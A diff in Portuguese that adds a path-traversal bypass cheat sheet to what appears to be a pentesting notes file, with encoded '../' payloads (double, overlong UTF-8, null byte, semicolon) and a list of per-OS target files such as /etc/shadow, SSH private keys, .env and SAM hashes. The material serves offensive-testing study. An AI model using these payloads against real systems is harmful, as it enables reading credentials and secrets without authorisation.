@@ -97,6 +97,72 @@ Bypasses de filtros:
 - Path truncation em sistemas antigos
 ```
 
+Categorias de encoding para bypass de traversal (fontes: directory_traversal_unix.txt, directory_traversal_win.txt):
+```text
+# Standard URL encoding
+%2e%2e%2f                           ../ basico
+%2e%2e/                             ponto encoded + barra literal
+..%2f                               pontos literais + barra encoded
+
+# Double URL encoding
+%252e%252e%252f                     %%32%65%%32%65%%32%66
+..%252f..%252f                      double-encode da barra
+
+# Overlong UTF-8 (bypass de normalizacao)
+%c0%ae%c0%ae%c0%af                  ../ em overlong 2-byte
+%e0%80%ae%e0%80%ae%e0%80%af         ../ em overlong 3-byte
+%c0%2e%c0%2e%c0%2f                  misto overlong + literal
+
+# Double overlong
+%25c0%25ae%25c0%25ae%25c0%25af      double-encode do overlong
+
+# Unicode fullwidth
+%uff0e%uff0e%u2215                  pontos fullwidth + barra fullwidth
+%uff0e%uff0e/                       pontos fullwidth + barra ASCII
+
+# Null byte (PHP < 5.3.4, Java antigo)
+..%00/                              null no meio
+.%00./                              null entre pontos
+../../../../etc/passwd%00           null para truncar extensao
+../../../../etc/passwd%00.jpg       null + extensao falsa
+
+# Semicolon (IIS, Tomcat)
+/etc/passwd;index.html              semicolon trunca o path
+..;/..;/..;/etc/passwd              semicolon em cada nivel
+
+# Hex prefix
+0x2e0x2e0x2f                        pontos e barra como hex
+
+# Separadores mistos
+..\/..\/..\/etc/passwd              backslash + forward slash
+..%5c..%5c..%5cetc%5cpasswd        backslash URL-encoded
+....\/....\/etc/passwd              double-dot + backslash
+....//....//....//etc/passwd        double-dot + double-slash
+```
+
+Alvos comuns por SO:
+```text
+# Linux
+/etc/passwd                         usuarios do sistema
+/etc/shadow                         hashes de senha (requer root)
+/etc/hostname                       nome do host
+/proc/self/environ                  variaveis de ambiente do processo
+/proc/self/cmdline                  linha de comando do processo
+/home/user/.ssh/id_rsa              chave SSH privada
+/var/www/html/.env                  segredos da aplicacao
+/app/config/database.yml            credenciais de banco (Rails)
+/opt/application/application.properties  config Spring Boot
+
+# Windows
+C:\Windows\win.ini                  validacao basica
+C:\boot.ini                         validacao basica (legado)
+C:\Windows\System32\config\SAM      hashes de senha local
+C:\Windows\System32\drivers\etc\hosts   arquivo hosts
+C:\inetpub\wwwroot\web.config       config IIS com connection strings
+C:\Users\Administrator\.ssh\id_rsa  chave SSH do admin
+C:\Windows\repair\SAM               backup do SAM
+```
+
 Casos reais e mentalidade de ataque (RWBH): Yahoo e Uber (downloads/templates) mostram leitura de arquivos e log poisoning; o atacante testa `../`, wrappers PHP, upload + LFI e caminhos absolutos.
 
 ## Notable CVEs
